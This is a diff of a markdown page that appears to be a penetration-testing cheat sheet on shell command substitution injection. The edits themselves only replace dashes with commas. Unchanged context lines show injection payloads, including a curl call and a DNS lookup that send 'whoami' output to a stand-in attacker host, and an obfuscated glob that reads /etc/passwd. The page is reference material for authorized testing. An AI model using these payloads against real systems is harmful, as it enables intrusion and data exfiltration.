@@ -12,7 +12,7 @@ keywords:
 
 # Backticks and `$(...)`
 
-Command substitution runs a nested command and **replaces the expression with its standard output**, inline, before the outer command runs. The two forms, `$(cmd)` and `` `cmd` ``, do the same thing. Because substitution is expanded *inside* the existing command line, it fires even when your input lands in the **middle of an argument**—where a separator like `;` would not yet terminate the command.
+Command substitution runs a nested command and **replaces the expression with its standard output**, inline, before the outer command runs. The two forms, `$(cmd)` and `` `cmd` ``, do the same thing. Because substitution is expanded *inside* the existing command line, it fires even when your input lands in the **middle of an argument**, where a separator like `;` would not yet terminate the command.
 
 > **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Executing commands without written authorization is unlawful.
 
@@ -29,7 +29,7 @@ The shell runs `id`, then builds the final argument from `127.0.0.1` plus the ou
 
 ## Mid-argument injection
 
-Separators need to sit at a statement boundary. Substitution does not—it expands wherever it appears, so it survives inside quotes and in the middle of a token:
+Separators need to sit at a statement boundary. Substitution does not, it expands wherever it appears, so it survives inside quotes and in the middle of a token:
 
 ```
 # double-quoted sink: ping -c 1 "$host"
@@ -51,7 +51,7 @@ $(curl http://10.0.0.1/$(whoami))
 
 ## Blind out-of-band use
 
-When output is not reflected, splice command output into a hostname so it leaves via DNS/HTTP to a server you control—confirmation and exfiltration in one:
+When output is not reflected, splice command output into a hostname so it leaves via DNS/HTTP to a server you control, confirmation and exfiltration in one:
 
 ```
 127.0.0.1; nslookup $(whoami).OOB_ID.attacker.example
@@ -73,7 +73,7 @@ $(/???/c?t /???/p?sswd)        # globbing to avoid literal keywords
 
 ## Platform note
 
-`$(...)` and backticks are **POSIX/bash** constructs. Windows `cmd.exe` has no equivalent—use `%VAR%` expansion and `for /f` instead, or shift to PowerShell, where `$(...)` is the substitution operator (`ping 127.0.0.1; $(whoami)`).
+`$(...)` and backticks are **POSIX/bash** constructs. Windows `cmd.exe` has no equivalent, use `%VAR%` expansion and `for /f` instead, or shift to PowerShell, where `$(...)` is the substitution operator (`ping 127.0.0.1; $(whoami)`).
 
 ## References
 
